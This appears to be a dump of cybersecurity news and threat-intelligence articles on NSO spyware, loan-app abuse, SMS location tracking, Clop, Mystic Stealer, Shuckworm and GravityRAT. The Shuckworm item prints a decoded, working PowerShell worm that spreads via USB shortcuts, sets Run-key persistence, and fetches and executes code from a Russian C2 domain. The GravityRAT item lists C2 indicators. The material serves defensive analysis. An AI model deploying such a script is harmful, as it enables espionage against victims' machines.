      "text": " Hanan Elatr Khashoggi is seeking unspecified damages in the suit, which alleges NSO Group violated federal and Virginia hacking laws by selling its powerful and often undetectable spyware to repressive foreign governments.Elatr Khashoggi’s suit alleges that in April 2018, while working as a flight attendant, she arrived at Dubai International Airport and was blindfolded, handcuffed and taken to an interrogation cell where she was questioned about Jamal Khashoggi for several hours. Her lawsuit states that researchers have determined that spyware was likely installed on her device during the interrogation.\"Hanan was detained and her captors took both of her cellphones that she had been using to communicate with Jamal,” the complaint alleges.Jamal Khashoggi, then 59, was killed in Istanbul’s Saudi consulate months after his wife was detained, on October 2, 2018. He is also believed to have been tracked by Pegasus.NSO Group, a subsidiary of Q Cyber Technologies, did not immediately reply to a request for comment. Underscoring the power of its technology, the defense contractor L3 Harris negotiated to acquire the firm before dropping out after intense public pressure from the Biden administration, which blacklisted the spyware company in 2021.The suit asserts that Khashoggi has been unable to travel to the Middle East for years due to fears for her physical safety, isolating her from family.“Hanan is still suffering from the effects of the NSO Group infiltration of her devices\ntoday,” the suit alleges. “She lives in a state of constant hyper-vigilance, unable to safely participate in social activities, constantly looking over her shoulder.”The suit, which seeks compensatory and punitive damages, condemns NSO Group for long infringing upon the “basic principles of personal freedom and the fundamental right to privacy through the creation, sale, and operation of highly sophisticated and malicious spyware.”It further argues that NSO’s actions have “resulted in disastrous outcomes, including\nintimidation, physical injury, and death” and that for Elatr Khashoggi, this intimidation has been responsible for “forever altering her life.”Suzanne Smalley is a reporter covering privacy, disinformation and cybersecurity policy for The Record.

      "text": " These \"seemingly legitimate\" financial mobile apps were found to request access to text messages, contacts and photos/videos before a loan can be provided. They then go on to collect personal data from users' smartphones as collateral in the case that the user delays a debt payment.Unlike more legitimate microfinance options, these apps' operators ask permission to use the data collected from the smartphone in order to force the user to return the debt in various unscrupulous ways, according to Kaspersky's research. For instance, information can be dispatched to all the user's contacts informing them of the user's debt, accompanied by photos from the gallery.\"While users should certainly report any suspicious apps to Google, they also need to stay alert for apps that may ask for a little too much access to the device's resources. For example, why would a loan app need access to your camera, your photos, or other documents on your device? Always think carefully before giving permission to any app you've downloaded,\" says Chris Hauk, consumer privacy champion at Pixel Privacy.There are several reasons that apps like these are making headway in the region. Paul Bischoff, consumer privacy advocate at Comparitech, points out that it's an emerging technology market, where mobile infrastructure an important and necessary tool that enables basic needs, and many users \"are not prepared for the barrage of scams and malware on the Internet.\" For many, their mobile phone is their only computing device, their only banking outlet, their only communications link, and even their only TV.In the case of the shady microlending apps, the fact that they're being used by people with few traditional financial options could translate to users more concerned with life goals than giving 100% attention to the apps' legitimacy and permissions. Another contributing factor is the lack of technology protections typically found elsewhere. For instance, even though Android holds a dominant market share of 78% in the Middle East and 80% in Africa, according to Kaspersky, Bischoff suspects some phones sold in the region may not come with access to standard Google services like the Play Store, leaving users to the vagaries of less-reputable app stores that are more likely to contain malware and other unwanted apps.Meanwhile, Hauk says while Google does vet the apps it allows into the Google Play Store, the system is not specifically designed to check for apps like these over-permissioned lending apps, anyway.Tom Davison, senior director of engineering international at Lookout, notes that the challenge with mobile apps in the META region is multi-faceted, beyond just fully functioning apps being overzealous with the permissions they request, exposing user data. All the other mobile issues are present as well: Outdated versions of apps may contain known software vulnerabilities that can be exploited; and outright malicious versions of apps exist which may impersonate well-known brands, again putting users at risk. But the usual best practices, like only using trusted app stores, scrutinizing permissions requested by apps, and always applying software updates, are for now aspirational goals for many META users.Davison notes, \"The reality is, for most users, without some additional help, it can be very challenging to spot what is legitimate and what is not,\" especially if apps such as microlending offerings are potentially downloaded in a state of desperation, he adds.To boot, awareness of bugs can be scattered, at best, especially given that in the Android ecosystem, it's up to every OEM to deploy its own patches, and the schedules can vary wildly between device-makers — it's a lot for a mobile-only, non-cyber-savvy person to keep up with. All of this underscores the need for a more institutional, private-sector, and security-company emphasis on boosting cyber fluency and maturity, awareness training, and vendor safety efforts in the region.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " A team of university researchers has devised a new side-channel attack named 'Freaky Leaky SMS,' which relies on the timing of SMS delivery reports to deduce a recipient's location.SMS delivery reports are handled by the SMSC (short message service center) of the mobile network to inform when a message has been delivered, accepted, failed, is undeliverable, has expired, or has been rejected.While there are routing, network node propagation, and processing delays in this process, mobile networks' fixed nature and specific physical characteristics result in predictable times when standard signal pathways are followed.The researchers developed a machine learning algorithm that analyzes timing data in these SMS responses to find the recipient's location at an accuracy of up to 96% for locations across different countries and up to 86% for two locations in the same country.The attacker will first have to collect some measurement data to make concrete correlations between the SMS delivery reports and the known locations of their target.The more precise data the attacker has about their targets' whereabouts, the more accurate the location classification results in the ML model's predictions will be in the attack phase.To collect the data, the attacker must send multiple SMS to the target, either masking them as marketing messages that the recipient will ignore or disregard as spam or using silent SMS messages.Silent SMS is a \"type 0\" message with no content, which produces no notifications on the target's screen, yet its reception is still acknowledged by the device on the SMSC.In their experiments, the authors of the paper used ADB to send bursts of 20 silent SMSes every hour for three days to multiple test devices in the United States, United Arab Emirates, and seven European countries, covering ten operators and various communication technologies and generations.Next, they measured the SMS delivery reports timing in each case and aggregated the data with the matching location signatures to generate a comprehensive ML evaluation dataset.The ML model used a total of 60 nodes (10 input, 10 output, 40 hidden), and the training data also included receiving location, connectivity conditions, network type, receiver distances, and others.The experiment focuses on \"closed world\" attack scenarios, meaning the classification of the target's location on one of the pre-determined locations.The academics found that their model achieved high accuracy in discerning between domestic and overseas locations (96%), similarly good guesses in country classification (92%), and reasonably good performance for locations within the same region (62%-75%).Accuracy depends on the location, operator, and conditions. For example, in Germany, the system had an average accuracy of 68% over 57 different classifications, with the best performance being 92% in a specific German region.Belgium had the best results, with an average of 86% correct guesses and a maximum of 95% in the best-performing region.When three locations are considered in Germany, the model's prediction accuracy drops to an average of 54% and tops at 83% in the best-performing case, which is still significantly higher than the 33% of random guessing.For Greece, the model delivered a notable average of 79% correct location predictions for three locations (random 33%) and reached 82% in the best case.In short, open-world attacks are feasible based on the use of probability outputs, anomaly detection, and including landmarks and other locations of interest in the ML training dataset. However, the scale of the attack grows exponentially, and the scope is beyond the present paper.Although the attack involves tedious preparatory work, isn't trivial to carry out, does not work well under all circumstances, and has several practical limitations, it still constitutes a potential privacy risk for users.One of the researchers signing the paper, Evangelos Bitsikas, told BleepingComputer that for this experiment, they considered themselves baseline attackers, meaning that they were restricted in terms of resources, machine learning knowledge, and technical capacity.This means that sophisticated attackers with more resources in their hands could theoretically achieve more impact and even enjoy moderate success in the \"open world\" attack scenarios."

They reiterated these claims this week in a message on their Tor data, saying they are only financially motivated and are not interested in politics.\"We got a lot of emails about government data, we don't have any government data and anything directly residing on exposed and bad protected not encrypted file transfer we still do the polite thing and delete all,\" reads a message on the Clop data leak site.While the threat actors claim to be deleting any data stolen from governments, there is no way to determine if this actually takes place. Therefore, federal agencies must make the assumption that stolen data could be abused or potentially acquired by foreign governments.The Rewards for Justice program hopes to prevent future attacks by enticing people, including other threat actors who may have information about the Clop operation, to submit tips for a million-dollar reward."

The attacks first targeted Scandinavian Airlines (SAS), with the threat actors demanding $3,500 to stop the DDoS attacks.The group later targeted the websites for American companies, such as Tinder, Lyft, and various hospitals throughout the USA.In June, Anonymous Sudan turned their attention to Microsoft, where they began DDoS attacks on web-accessible portals for Outlook, Azure, and OneDrive, demanding $1 million to stop the attacks.\"You have failed to repel the attack which has continued for hours, so how about you pay us 1,000,000 USD and we teach your cyber-security experts how to repel the attack and we stop the attack from our end? 1 million USD is peanuts for a company like you,\" demanded the group.During the DDoS attacks on Outlook, the group said they were being conducted in protests of the USA's involvement in Sudanese politics.\"This is a continuous campaign against US/American companies & infrastructure because of the statement of the US Secretary of State saying there is a possibility of American invasion of Sudan,\" stated Anonymous Sudan.This link may have become further apparent this week, with the group claiming to form a \"DARKNET parliament\" consisting of other pro-Russia groups, such as KILLNET and \"REvil.\"\"72 hours ago, three heads of hacker groups from Russia and Sudan held a regular meeting in the DARKNET parliament, and came to a common decision,\" warned the group about impending attacks on European banking infrastructure.\"Today we are starting to impose sanctions on the European banking transfer systems SEPA, IBAN, WIRE, SWIFT, WISE.\"While there has been no indication that attacks on European banking systems have started, the group has demonstrated that they have significant resources at their disposal, and financial institutions should be on alert for potential disruption."

      "text": " A new information-stealing malware named 'Mystic Stealer,' has been promoted on hacking forums and darknet markets since April 2023, quickly gaining traction in the cybercrime community.The malware, rented for $150/month, targets 40 web browsers, 70 browser extensions, 21 cryptocurrency applications, 9 MFA and password management applications, 55 cryptocurrency browser extensions, Steam and Telegram credentials, and more.Mystic Stealer debuted version 1.0 in late April 2023 but quickly ramped up to version 1.2 towards the end of May, indicating an active development for the project.The project also operates a Telegram channel (Mystic Stealer News) where development news, feature requests, and other relevant topics are discussed.It is reported that the creator of the new malware accepts feedback from established members of the underground hacking community and openly invites them to share suggestions for improving Mystic.Cyfirma reports that veterans in the space have verified the malware's effectiveness and confirmed that despite its early development status, it is a potent info-stealer.Mystic Stealer can target all Windows versions, including XP to 11, supporting 32 and 64-bit OS architectures.The malware does not need any dependencies, so its footprint on infected systems is minimal, while it operates in memory to avoid detection from anti-virus products.Moreover, Mystic performs several anti-virtualization checks, like inspecting the CPUID details to ensure it is not executed in sandboxed environments.Mystic's author has added an exclusion for Commonwealth of Independent States (CIS) countries (formerly the Soviet Union), which could indicate the new malware's origin.The Zscaler/InQuest report says that another restriction set by the creator is to prevent the malware from running builds older than a specified date, possibly to minimize the malware's exposure to security researchers.Starting May 20, 2023, the malware's author added a loader functionality allowing Mystic to fetch additional payloads from the C2 server.All communication with the C2 is encrypted using a custom binary protocol over TCP, while all stolen data is sent directly to the server without first storing it on the disk.This is an unusual approach for info-stealer malware but helps Mystic evade detection.The operator can configure up to four C2 endpoints for resiliency, which are encrypted using a modified XTEA-based algorithm.Upon first execution, Mystic gathers OS and hardware information and snaps a screenshot, sending the data to the attacker's C2 server.Depending on the instructions it receives, the malware will target more specific data stored in web browsers, applications, etc.Zscaler and Inquest's report gives the complete list of targeted apps, which includes popular web browsers, password managers, and cryptocurrency wallet apps.Notable entries in the list include: Although the future of Mystic Stealer is still in debate, considering the volatile nature of illegal MaaS projects, its emergence signals elevated risk for users and organizations.The recent addition of a loader could help Mystic operators drop payloads such as ransomware onto compromised computers, so extreme caution is advised when downloading software from the internet."

      "title": "Shuckworm: Inside Russia’s Relentless Cyber Campaign Against Ukraine | Symantec Enterprise Blogs",
      "text": " The Shuckworm espionage group is continuing to mount multiple cyber attacks against Ukraine, with recent targets including security services, military, and government organizations.In some cases, Shuckworm has succeeded in staging long-running intrusions, lasting for as long as three months. The attackers repeatedly attempted to access and steal sensitive information such as reports about the deaths of Ukrainian military service members, enemy engagements and air strikes, arsenal inventories, military training, and more.In a bid to stay ahead of detection, Shuckworm has repeatedly refreshed its toolset, rolling out new versions of known tools and short-lived infrastructure, along with new additions, such as USB propagation malware.Shuckworm (aka Gamaredon, Armageddon) is a Russia-linked group that has almost exclusively focused its operations on Ukraine since it first appeared in 2014. Ukrainian officials have publicly stated that the group operates on behalf of the Russian Federal Security Service (FSB).Shuckworm is known to use phishing emails as an initial infection vector, in order to gain access to victim machines and distribute malware. The attackers send emails with malicious attachments to Ukrainian victims, with the attachments of various file types, such as:The victim lures we observed related to armed conflicts, criminal proceedings, combating crime, and protection of children, among others.Once victims were infected, the attackers then proceed to download additional backdoors and tools onto targeted machines.Examples of recent scheduled tasks include execution of the following command lines:The new PowerShell script is used to first copy itself onto the infected machine and create a shortcut file using an rtk.lnk extension. The script uses file names such as “porn_video.rtf.lnk”, “do_not_delete.rtf.lnk”” and “evidence.rtf.lnk” in an attempt to entice individuals to open the files. These file names are generally in Ukrainian, but some are also in English.Next, the script enumerates all drives, copying itself to any available removable disks – USB drives. These USB drives are likely used by the attackers for lateral movement across victim networks and may be used to help the attackers reach air-gapped machines within targeted organizations.In this recent activity, we also observed the group leveraging legitimate services to act as C&C servers, including using the Telegram messaging service for its C&C infrastructure. More recently, they have also used Telegram’s micro-blogging platform, called Telegraph, to store C&C addresses.Shuckworm tends to only use its C&C infrastructure for short periods of time, limiting the usefulness of its C&Cs when it comes to finding more activity or linking activity together. However, the group does use SSL certificates that have some commonalities that may be leveraged for tracking purposes. We believe the group is likely leveraging pre-configured images for use in its C&C deployment. These data points can help researchers to identify additional C&C infrastructure and Shuckworm activity.Symantec also saw what was likely Giddome, an infostealer tool that is a known Shuckworm backdoor, deployed onto victim networks to steal and exfiltrate data of interest.The following describes a typical attack chain seen on a victim machine compromised by Shuckworm in this campaign.In one attack, the first sign of malicious activity was when the user appeared to open a RAR archive file that was likely delivered via a spear-phishing email and which contained a malicious document.After the document was opened, a malicious PowerShell command was observed being executed to download the next-stage payload from the attackers’ C&C server:More recently, Symantec has observed Shuckworm leveraging more IP addresses in their PowerShell scripts. This is likely an attempt to evade some tracking methods employed by researchers.Shuckworm also continues to update the obfuscation techniques used in its PowerShell scripts in an attempt to avoid detection, with up to 25 new variants of the group’s scripts observed per month between January and April 2023.Next, a VBS script, which was Shuckworm’s Pterodo backdoor, was executed:Following this, we saw what appeared to be multiple similar scripts being executed. The machine used for this activity appeared to contain multiple confidential documents related to Ukrainian security services or government departments.On a different machine, we saw malicious activity that appeared to be executed from a file (foto.safe) that had been dropped by an infected USB key that someone had plugged into the system. Symantec observed multiple file paths present on infected machines that indicate users had plugged in an infected USB key e.g. \"usb-накопитель\" translates as \"usb-drive\".The foto.safe file is a Base64-encoded script.Decoded it looks like the following:fUNCtIon sET-lnK ($chILd) {$nAMetxt = \"foto.sAfe\".TolowER();$NAmE = (\"кОМПРОМат\", \"КОРЗиНА\", \"СеКРетнО\" | GeT-rAnDOm).ToUPPeR();$WSHSHELl = NEw-obJeCT -CoMObjeCT WSCriPT.shELL;$sHORTcut = $wShShEll.CREatesHoRTCUt($cHild +\"\\$nAMe.LNK\");$shoRtCuT.iConloCaTiON = \"C:\\wiNDoWS\\SysteM32\\SHELL32.DLL,3\";$SHOrTcUT.TArGetpAth = \"c:\\wInDOwS\\sYstEm32\\WInDOwSpowERshell\\V1.0\\POwERShEll.ExE\".ToLoweR();$text = \"-wInDoWsTYlE hidDeN -nolOgo Iex (IeX (GeT-cOnTent .\\$NAMetxt | OUT-STrIng))\".TOlower();$sHORTCUT.ArGUMEnTs = $tExt;$sHortCUT.saVE();$mYfIlE= $chIlD+\"\\$naMeTXT\"cOPY-Item $enV:UsErprOfilE\\iNdEx.phP -deSTINAtION $mYfILE$FIlE=GEt-ITEM $mYfiLE -forCe$FiLe.ATtRiButes='hiDDEN' }Set-ITemPRoPERTY -pAth HkCU:\\soFTWare\\MicROsOfT\\WiNDows\\cURRENtVerSiON\\ruN -NAME safE -valUE $env:windir'\\sYSTeM32\\wINDoWSPowErSHEll\\v1.0\\pOwERShell.eXE -WIndowSTYlE hiddEN -noLOgO inVOkE-ExpREsSIOn (get-contEnT $eNV:usERPRoFILe\\INdEX.PHp | Out-sTRing) | poweRSHeLL -noPROfILE';coPy-item  .\\\"fOtO.safe\"  -dEsTInaTioN $Env:USeRprOFIle\\iNdEX.pHpWHile($CoUNT -lE 2){$urLs = 'hTTP://'+ [SYSTEM.NEt.DnS]::geThostadDREsSes([String]$(GEt-random)+'.cOriDAS.Ru') +'/slEEP.Php';iEX $(New-ObJeCt Net.WEBClient).uPloAdStRING($uRls.ToloWER(),'')$drIVE = GeT-wmIoBJeCt WIN32_VOluME -fILTer \"drIvETYPe='2'\";$Drive.naMe | FOreaCH-oBJecT{$CHiLdS = GET-ChilDITem $drivE.nAMefoReach($cHilDs IN $chiLDs){if( [SYsTEM.io.fiLE]::GetAttributES($ChilDS.FuLlnAMe) -eq [SYsTEM.Io.fILeaTTrIbuTES]::DIRecToRy ){sET-lnk $chILds.fUlLName}}IF(($dRIVe.CapaCITY - $DriVe.fREeSPACE) -Gt 1000000){SEt-lNK $DRivE.name}}STArt-SLEeP -S 300;}This PowerShell script is used to copy itself onto the infected machine and then create a shortcut file that links to the PowerShell script. Symantec has identified multiple variants of this script that can be used to indicate successful infection, or to download additional tools onto infected machines. One of the most significant things about this campaign is the targets, which include Ukrainian military, security, research, and government organizations. The attackers were observed focusing on machines that contained what appeared from file names to be sensitive military information that may be abused to support Russian kinetic war efforts.   The majority of these attacks began in February/March 2023, with the attackers maintaining a presence on some of the victim machines until May. The sectors and nature of the organizations and machines targeted may have given the attackers access to significant amounts of sensitive information. There were indications in some organizations that the attackers were on the machines of the organizations’ human resources departments, indicating that information about individuals working at the various organizations was a priority for the attackers, among other things.This activity demonstrates that Shuckworm’s relentless focus on Ukraine continues. It seems clear that Russian nation-state-backed attack groups continue to prioritize high-value Ukrainian targets in attempts to find data that may potentially help their military operations.Malicious documentsUSB propagation scriptsExample of LNK files createdLNK file namesRecent C&C infrastructure (2023)The Threat Hunter Team is a group of security experts within Symantec whose mission is to investigate targeted attacks, drive enhanced protection in Symantec products, and offer analysis that helps customers respond to attacks.We encourage you to share your thoughts on your favorite social platform."

Distribution website of the malicious BingeChat messaging appThe website should provide the malicious app after tapping the DOWNLOAD APP button; however, it requires visitors to log in. We didn’t have credentials, and registrations were closed (see Figure 2). It is most probable that the operators only open registration when they expect a specific victim to visit, possibly with a particular IP address, geolocation, custom URL, or within a specific timeframe. Therefore, we believe that potential victims are highly targeted.Figure 2. The service currently doesn’t provide registrationsAlthough we couldn’t download the BingeChat app via the website, we were able to find a URL on VirusTotal (https://downloads.bingechat[.]net/uploadA/c1d8bad13c5359c97cab280f7b561389153/BingeChat.zip) that contains the malicious BingeChat Android app. This app has the same hash as the app in the previously mentioned tweet, which means that this URL is a distribution point for this particular GravityRAT sample.The same domain name is also referenced within the code of the BingeChat app – another hint that bingechat[.]net is used for distribution (see Figure 3).Figure 3.

GravityRAT distribution mechanismESET telemetry data has not recorded any victims of this BingeChat campaign, further suggesting that the campaign is probably narrowly targeted. However, our telemetry has one detection of another Android GravityRAT sample in India that occurred in June 2022. In this case, GravityRAT was branded as Chatico (see Figure 6).Figure 6. The login activity screen of ChaticoLike BingeChat, Chatico is based on the OMEMO Instant Messenger app and trojanized with GravityRAT. Chatico was most likely distributed through the chatico.co[.]uk website and also communicated with a C&C server. The domains for both the website and C&C server are now offline.From here on out, we will only focus on the active campaign using the BingeChat app, which has the same malicious functionality as Chatico.Figure 7. Comparison of the class names for the trojan masquerading as legit SoSafe Chat (left) and BingeChat (right) appsAfter launch, the app requests the user to allow all the necessary permissions to work properly, as shown in Figure 8. Except for permission to read the call logs, the other requested permissions are typical of any messaging application, so the device user might not be alarmed when the app requests them.Figure 8. Permissions requested by BingeChatAs part of the app’s legitimate functionality, it provides options to create an account and log in. Before the user signs into the app, GravityRAT starts to interact with its C&C server, exfiltrating the device user’s data and waiting for commands to execute. GravityRAT is capable of exfiltrating:Data to be exfiltrated is stored in text files on external media, then exfiltrated to the C&C server, and finally removed. The file paths for the staged data are listed in Figure 9.Figure 9. File paths to data staged for exfiltrationThis version of GravityRAT has two small updates compared to previous, publicly known versions of GravityRAT. First, it extends the list of files to exfiltrate to those with the crypt14, crypt12, crypt13, crypt18, and crypt32 extensions. These crypt files are encrypted backups created by WhatsApp Messenger. Second, it can receive three commands from a C&C server to execute:These are very specific commands that are not typically seen in Android malware. Previous versions of Android GravityRAT could not receive commands at all; they could only upload exfiltrated data to a C&C server at a particular time.GravityRAT contains two hardcoded C&C subdomains shown in Figure 10; however, it is coded to use only the first one (https://dev.androidadbserver[.]com).Figure 10. Hardcoded initial C&C serversThis C&C server is contacted to register a new compromised device, and to retrieve two additional C&C addresses: https://cld.androidadbserver[.]com and https://ping.androidadbserver[.]com when we tested it, as shown in Figure 11.Figure 11. C&C communication to register a new deviceAgain, only the first C&C server is used, this time to upload the device user’s data, as seen in Figure 12.Figure 12. Victim data exfiltration to C&C serverAccording to ESET telemetry, a user in India was targeted by the updated Chatico version of the RAT, similar to previously documented SpaceCobra campaigns. The BingeChat version is distributed through a website that requires registration, likely open only when the attackers expect specific victims to visit, possibly with a particular IP address, geolocation, custom URL, or within a specific timeframe. In any case, we believe the campaign is highly targeted.\n\n\nSHA-1\nPackage name\nESET detection name\nDescription\n\n\n\n\n2B448233E6C9C4594E385E799CEA9EE8C06923BD\neu.siacs.bingechat\nAndroid/Spy.Gravity.A\nGravityRAT impersonating BingeChat app.\n\n\n25715A41250D4B9933E3599881CE020DE7FA6DC3\neu.siacs.bingechat\nAndroid/Spy.Gravity.A\nGravityRAT impersonating BingeChat app.\n\n\n1E03CD512CD75DE896E034289CB2F5A529E4D344\neu.siacs.chatico\nAndroid/Spy.Gravity.A\nGravityRAT impersonating Chatico app.\n\n\n\n\n\nIP\nDomain\nHosting provider\nFirst seen\nDetails\n\n\n\n\n75.2.37[.]224\njre.jdklibraries[.]com\nAmazon.com, Inc.\n2022-11-16\nChatico C&C server.\n\n\n104.21.12[.]211\ncld.androidadbserver[.]com\nadb.androidadbserver[.]com\nCloudflare, Inc.\n2023‑03‑16\nBingeChat C&C servers.\n\n\n104.21.24[.]109\ndev.jdklibraries[.]com\nCloudflare, Inc.\nN/A\nChatico C&C server.\n\n\n104.21.41[.]147\nchatico.co[.]uk\nCloudflare, Inc.\n2021-11-19\nChatico distribution website.\n\n\n172.67.196[.]90\ndev.androidadbserver[.]com\nping.androidadbserver[.]com\nCloudflare, Inc.\n2022-11-16\nBingeChat C&C servers.\n\n\n172.67.203[.]168\nbingechat[.]net\nCloudflare, Inc.\n2022‑08‑18\nBingeChat distribution website.\n\n\nData is staged for exfiltration in the following places:/storage/emulated/0/Android/ebc/oww.log\n/storage/emulated/0/Android/ebc/obb.log\n/storage/emulated/0/bc/ms.log\n/storage/emulated/0/bc/cl.log\n/storage/emulated/0/bc/cdcl.log\n/storage/emulated/0/bc/cdms.log\n/storage/emulated/0/bc/cs.log\n/storage/emulated/0/bc/location.log\n      Sign up for our newsletters\n    ESET ResearchUnlucky Kamran: Android malware spying on Urdu-speaking residents of Gilgit-BaltistanESET ResearchUnlucky Kamran: Android malware spying on Urdu-speaking residents of Gilgit-Baltistan • ESET ResearchWho killed Mozi?

      "title": "Traditional Pen Testing vs. PTaaS with Web Application Security",
      "text": " But is this just a new coat of paint on an old practice or a legitimate, innovative option for companies seeking stronger security?This article delves into the heart of PTaaS, uncovering its distinctive features and advantages over traditional pen testing. We examine the integral role of scanners in PTaaS, illuminating how they complement human-led testing by catching anomalies that might slip past the human eye.Once the process is complete, the team provides a detailed report outlining the identified weaknesses and suggesting ways to mitigate them.However, this approach to pen testing is, by nature, a point-in-time exercise. It provides a snapshot of the application’s security status at the moment of the test but does not account for any new vulnerabilities that might emerge after the test.As a result, the time between pen tests can leave organizations vulnerable to threats. This is where penetration testing as a service, or PTaaS, comes in.PTaaS revolutionizes the traditional pen testing model by introducing a continuous approach to web application security testing. Instead of a one-off examination, PTaaS offers ongoing, real-time testing that combines the benefits of manual pen tests with automated scanning tools.The most distinguishing feature of PTaaS is its continuous approach to security testing. In contrast to traditional pen testing, which offers a one-time view of vulnerabilities, PTaaS provides ongoing monitoring and testing of web applications.This strategy ensures that new vulnerabilities are detected and addressed promptly, reducing the window of opportunity for potential cyberattacks.These scanners can quickly go through vast amounts of data and identify issues that might be missed by human testers, such as minor configuration errors. They can also promptly identify common vulnerabilities and exposures (CVEs) as they emerge.This combination of manual and automated testing allows for a more thorough and continuous security assessment. It ensures that vulnerabilities are not just identified during scheduled pen tests but are also continuously detected and addressed as they arise.In contrast, the unique value of human pen testers lies in their capacity for creative thinking, complex vulnerability exploitation, and understanding the intricate business context. They are skilled at crafting unique attack vectors, simulating social engineering attacks, and detecting business logic flaws — issues that automated scanners might miss.PTaaS optimally leverages the power of both, offering a comprehensive and potent cybersecurity solution.Industry opinions on PTaaS are varied and reflect a broad spectrum of experiences and expectations.However, concerns are also raised within these discussions. For instance, some express skepticism regarding the ability of PTaaS to match the depth of traditional penetration testing conducted by experienced professionals. Others worry about the reliance on automation, the possibility of false positives, and the potential for overlooking vulnerabilities that a human tester might spot.Despite these concerns, there is a recognition of the benefits that PTaaS can bring to the table. These include the continuous monitoring of systems, the ability to identify and respond to vulnerabilities rapidly, and the combination of human-led testing and automated scanning for a more comprehensive security assessment.The industry discussions highlight a key point: the digital landscape is evolving rapidly, and cybersecurity strategies need to evolve in tandem. In this context, PTaaS emerges as a legitimate and progressive option. It’s not merely traditional penetration testing repackaged but an enhancement that leverages the best of both automated and human-led testing.One of the most striking features of Outpost24’s PTaaS is its emphasis on a continuous feedback loop. This means that the process doesn’t stop at merely identifying vulnerabilities. Instead, any remediation undertaken to address the vulnerabilities is also retested, ensuring that the fixes are effective and that the web application’s security posture remains robust.This continuous monitoring and retesting mechanism enhances the web application’s resilience to potential threats.Outpost24 also offers the unique advantage of allowing clients to interact directly with the penetration testers who carry out their security assessments. This interactive element facilitates clearer communication and a more nuanced understanding of the identified vulnerabilities, their potential impact, and the remediation required.It creates an environment of collaborative security improvement, which is more effective than a one-way delivery of test results.This allows businesses to understand the potential exploitation paths a threat actor could take, thereby empowering them to develop more effective defense strategies.Outpost24’s approach to PTaaS exemplifies how the service can be more than just “penetration testing with a new coat of paint.”"

      "text": " The Clop ransomware gang has started extorting companies impacted by the MOVEit data theft attacks, first listing the company's names on a data leak site—an often-employed tactic before public disclosure of stolen informationIf an extortion demand is not paid, the threat actors say they will begin leaking stolen data on June 21st.Yesterday, the Clop threat actors listed thirteen companies on their data leak site but did not state if they were related to the MOVEit Transfer attacks or were ransomware encryption attacks.Since then, one of the companies, Greenfield CA, has been removed, indicating the listing was either a mistake or negotiations are taking place.Five of the listed companies, British multinational oil and gas company Shell, UnitedHealthcare Student Resources (UHSR), the University of Georgia (UGA) and University System of Georgia (USG), Heidelberger Druck, and Landal Greenparks, have since confirmed to BleepingComputer that they were impacted in varying degrees by the MOVEit attacks.Shell said only a small number of employees and customers were impacted and Landal told BleepingComputer the threat actors accessed the names and contact information for approximately 12,000 guests.The University System of Georgia, University of Georgia, and UnitedHealthcare Student Resources told BleepingComputer they are still investigating the attack and will disclose any breaches if discovered.German printing company Heidelberger Druck told BleepingComputer that while they use MOVEit Transfer, their analysis indicates it did not lead to any data breach.Putnam Investments, who is also listed on Clop's data leak site, told BleepingComputer they are looking into the matter.BleepingComputer has learned the extortion operation was not very successful in the GoAnywhere extortion attempts, with companies preferring to disclose data breaches rather than pay a ransom.However, the Clop threat actors previously told BleepingComputer that they automatically deleted any data stolen from the government.\"I want to tell you right away that the military, children's hospitals, GOV etc like this we no to attack, and their data was erased,\" claimed the ransomware operation.Unfortunately, once data is stolen, there is no way to confirm if data is actually deleted as promised, and should be assumed to be at risk."

      "text": " A new Android malware campaign spreading the latest version of GravityRAT has been underway since August 2022, infecting mobile devices with a trojanized chat app named 'BingeChat,' which attempts to steal data from victims' devices.WhatsApp backups are created to help users port their message history, media files, and data onto new devices, so they can contain sensitive data such as text, video, photos, documents, and more, all in unencrypted form.The spyware is spread under the name 'BingeChat,' supposedly an end-to-end encrypted chat app with a simple interface yet advanced features.ESET says the app is delivered through \"bingechat[.]net\" and possibly other domains or distribution channels, but the download is invite-based, requiring visitors to enter valid credentials or register a new account.While registrations are currently closed, this method allows them only to distribute the malicious apps to targeted people. It also makes it harder for researchers to access a copy for analysis.Upon digging further, ESET's analyst found that SpaceCobra had used OMEMO IM as a basis for another fake app named \"Chatico,\" which was distributed to targets in the summer of 2022 via the now-offline \"chatico.co[.]uk.\"BingeChat requests risky permissions upon its installation on the target's device, including access to contacts, location, phone, SMS, storage, call logs, camera, and microphone.These are standard permissions for instant messaging apps, so they are unlikely to raise suspicions or appear abnormal to the victim.Before the user registers in BingeChat, the app sends call logs, contact lists, SMS messages, device location, and basic device information to the threat actor's command and control (C2) server.Additionally, media and document files of jpg, jpeg, log, png, PNG, JPG, JPEG, txt, pdf, xml, doc, xls, xlsx, ppt, pptx, docx, opus, crypt14, crypt12, crypt13, crypt18, and crypt32 types, are also stolen.The crypt file extensions correspond to the WhatsApp Messenger backups mentioned previously.Another notable new feature of GravityRAT is its ability to receive three commands from the C2, namely \"delete all files\" (of a specified extension), \"delete all contacts,\" and \"delete all call logs.\"While SpaceCobra's campaigns are highly targeted and usually focus on India, all Android users should avoid downloading APKs from outside Google Play and be cautious with risky permission requests while installing any app.Update 6/17 - A Google spokesperson has sent the following comment on the threat of GravityRAT:"

They operate independently of the operating system and firmware, ensuring seamless control even when the system is powered down. However, because of their high privilege level and network accessibility, these devices make them attractive targets for malicious actors.The joint guidance emphasizes the importance of taking proactive measures to secure and maintain BMCs effectively, adding that many organizations fail to implement even minimum security practices.These shortcomings could result in BMCs being used by threat actors as entry points for various cyber-attacks, such as turning off security solutions, manipulating data or propagating malicious instructions across the network infrastructure.Further, the agencies said organizations should also monitor BMC integrity, move sensitive workloads to hardened devices, use firmware scanning tools periodically and treat unused BMCs as potential security risks.By following these recommendations, organizations can significantly enhance the security posture of their BMCs and reduce the risk of potential cyber threats."

